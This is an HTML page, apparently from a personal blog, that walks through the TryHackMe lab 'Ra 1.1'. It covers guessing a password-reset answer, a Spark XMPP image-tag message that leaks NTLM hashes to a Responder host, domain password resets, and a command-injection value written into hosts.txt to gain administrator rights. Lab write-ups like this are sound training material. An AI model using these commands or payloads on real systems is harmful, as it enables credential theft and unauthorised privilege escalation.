@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Offensive security writeups, penetration testing labs, and CTF walkthroughs focused on web, network, and privilege escalation techniques.">
+    <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe writeups, HackTheBox, CTF, cybersecurity, ethical hacking">
+    <meta name="author" content="xlondra">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Pentest Writeups & Security Notes">
+    <meta property="og:description" content="Offensive security lab writeups and CTF walkthroughs.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://xlondra.github.io">
+    <title>Ra 1.1 - TryHackMe - Walkthrough</title>
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+    <link rel="stylesheet" href="../../../assets/css/writeup.css">
+    <link rel="stylesheet" href="../../../assets/css/global.css">
+    <link rel="stylesheet" href="../../../assets/css/index.css">
+    <link rel="stylesheet" href="../../../assets/css/code.css">
+    <link rel="stylesheet" href="../../../assets/css/explain.css">
+
+    <script src="../../../assets/js/nav.js" defer></script>
+    <script src="../../../assets/js/footer.js" defer></script>
+    <script src="../../../assets/js/zoomer.js" defer></script>
+    <script src="../../../assets/js/writeup.js" defer></script>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali $> </span>
+                <span class="typed"></span><span class="cursor">_</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+            </div>
+            <div class="hamburger-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor"><path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/></svg></div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="writeup">
+            <div class="lab-header">
+                <h1 class="lab-title">TryHackMe - Ra 1.1 - Walkthrough</h1>
+
+                <ul class="lab-meta">
+                    <li><strong>Date:</strong> 25-03-2026</li>
+                    <li><strong>Platform:</strong> TryHackMe</li>
+                    <li><strong>Difficulty:</strong> Hard</li>
+                    <li><strong>Link:</strong> <a href="https://tryhackme.com/room/ra" target="_blank" rel="noopener noreferrer">Open Lab</a></li>
+                    <li><strong>Tags:</strong>
+                        <span class="tag">AD</span>
+                        <span class="tag">SMB</span>
+                        <span class="tag">XMPP</span>
+                    </li>
+                </ul>
+            </div>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Reconnaissance</h2>
+                <p>I started by adding the IP address to <b>/etc/hosts</b> as <b>windcorp.thm</b>.</p>
+                <p>Next, I began with an Nmap scan.</p>
+                <img src="images/nmap1.png" class="lab-image zoomable">
+                <p>A large number of ports were open, so I performed a version scan to identify the running services.</p>
+                <img src="images/nmap2.png" class="lab-image zoomable">
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="sudo nmap -sV -p53,80,88,135,139,389,443,445,464,593,636,2179,3268-3269,3389,5222,5223,5229,5262,5263,5269-5270,5275-5276,5985,7070,7443,7777,9090-9091,9389,49668,49670-49673,49694,49928 -T4 ra.thm">└─$ sudo nmap -sV -p53,80,88,135,139,389,443,445,464,593,636,2179,3268-3269,3389,5222,5223,5229,5262,5263,5269-5270,5275-5276,5985,7070,7443,7777,9090-9091,9389,49668,49670-49673,49694,49928 -T4 ra.thm</code></pre>
+                </div>
+                <p>The main services identified were <b>Active Directory</b>, <b>Kerberos</b>, and <b>Openfire</b> (an XMPP server).</p>
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Enumeration</h2>
+                <p>Browsing to port <b>80</b>, I found a <b>Reset Password</b> feature.</p>
+                <img src="images/resetPassword.png" class="lab-image zoomable">
+                <p>This required a username and a personal question.</p>
+
+                <p>Inspecting the page source revealed the following line:</p>
+                <span class="path">&lt;img src="img/lilyleAndSparky.jpg"&gt;</span>
+                <p>This suggested a username and pet name: <b>Sparky</b>. I used these details to reset the password.</p>
+                <img src="images/enteredPetName.png" class="lab-image zoomable">
+                <p>The password was successfully reset:</p>
+                <img src="images/newPassword.png" class="lab-image zoomable">
+
+                <p>Using the new credentials, I enumerated the SMB server:</p>
+                <img src="images/listShares.png" class="lab-image zoomable">
+
+                <p>This confirmed that the credentials were valid. I accessed the <b>Shared</b> share:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="smbclient //windcorp.thm/Shared -U lilyle">└─$ smbclient //windcorp.thm/Shared -U lilyle</code></pre>
+                </div>
+                <img src="images/firstFlagListed.png" class="lab-image zoomable">
+                <p>This allowed me to retrieve the first flag:</p>
+                <img src="images/firstFlag.png" class="lab-image zoomable">
+
+                <p>Inside the share, I found multiple binaries for <b>Spark 2.8.3</b>, an XMPP client vulnerable to CVE-2020-12772.<br>
+                This vulnerability was discovered by the room authors.</p>
+
+                <p>I downloaded JDK 8 <a href="https://adoptium.net/temurin/releases?version=8&os=any&arch=any" target="_blank" class="link">here</a> and installed Spark 2.8.3.<br>
+                I then followed <a href="https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md" class="link">this article</a> and started a <b>Responder</b> server on my VPN interface:</p>
+                
+                <div class="command-wrapper">
+                <pre><code data-copy-content="sudo responder -I tun0">└─$ sudo responder -I tun0</code></pre>
+                </div>
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Exploitation</h2>
+                <p>On port <b>80</b>, there was a list showing currently active users:</p>
+                <img src="images/onlineBuse.png" class="lab-image zoomable">
+
+                <p>Since <b>buse</b> was online, I sent the following message while Responder was running:</p>
+                <span class="path">&lt;img src="http://192.168.169.133/image.jpg"&gt;</span>
+                <p>Within seconds, I captured an NTLM hash:</p>
+                <img src="images/NTLMhash.png" class="lab-image zoomable">
+
+                <p>I cracked the hash using Hashcat on my host machine:</p>
+                <img src="images/crackedHash.png" class="lab-image zoomable">
+
+                <p>Using <b>evil-winrm</b>, I obtained a shell as <b>buse</b> with the cracked credentials and retrieved the second flag:</p>
+                <img src="images/secondFlag.png" class="lab-image zoomable">
+
+                <p>While enumerating the system, I found a <b>scripts</b> directory in <b>C:\</b> containing a PowerShell script named <b>checkservers.ps1</b>.<br>
+                The script reads from <b>C:\Users\brittanycr\hosts.txt</b>.<br>
+                Although I could not access this file as the current user, I was able to reset <b>brittanycr</b>'s password and add her to the <b>Remote Management Users</b> group:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="net user brittanycr Pass123! /domain">net user brittanycr Pass123! /domain</code></pre>
+                </div>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="net localgroup &quot;Remote Management Users&quot; brittanycr /add">net localgroup "Remote Management Users" brittanycr /add</code></pre>
+                </div>
+
+                <p>I then logged in as <b>brittanycr</b>:</p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="evil-winrm -i windcorp.thm -u brittanycr -p 'Pass123!'">└─$ evil-winrm -i windcorp.thm -u brittanycr -p 'Pass123!'</code></pre>
+                </div>              
+
+                <p>From this shell, I was able to read and modify <b>hosts.txt</b>:</p>
+
+                <div class="command-wrapper"><pre><code data-copy-content="cd C:\Users\brittanycr">cd C:\Users\brittanycr</code></pre></div>
+                <div class="command-wrapper"><pre><code data-copy-content="type hosts.txt">type hosts.txt</code></pre></div>
+
+                <p>I inserted the following payload to exploit command injection in the scheduled script and add <b>brittanycr</b> to the Administrators group:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="Set-Content C:\Users\brittanycr\hosts.txt '127.0.0.1; net localgroup administrators brittanycr /add'">Set-Content C:\Users\brittanycr\hosts.txt '127.0.0.1; net localgroup administrators brittanycr /add'</code></pre>
+                </div>
+
+                <p>After about 45 seconds (the script execution interval), the privileges were escalated. I then connected via RDP:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="xfreerdp /u:brittanycr /p:Pass123! /v:windcorp.thm /cert:ignore">└─$ xfreerdp /u:brittanycr /p:Pass123! /v:windcorp.thm /cert:ignore</code></pre>
+                </div>
+
+                <p>Finally, I navigated to <b>C:\Users\Administrator\Desktop</b> and retrieved <b>Flag3.txt</b>:</p>
+                <img src="images/lastFlag.png" class="lab-image zoomable">
+
+                <br><br>
+                <p>That's it, we got the last flag. Thanks for reading! I hope you learned something new.</p>
+            </section>
+        </article>
+    </main>
+    
+    <footer>
+        Copyleft &copy; <span id="year"></span>
+    </footer>
+</body>
+</html>
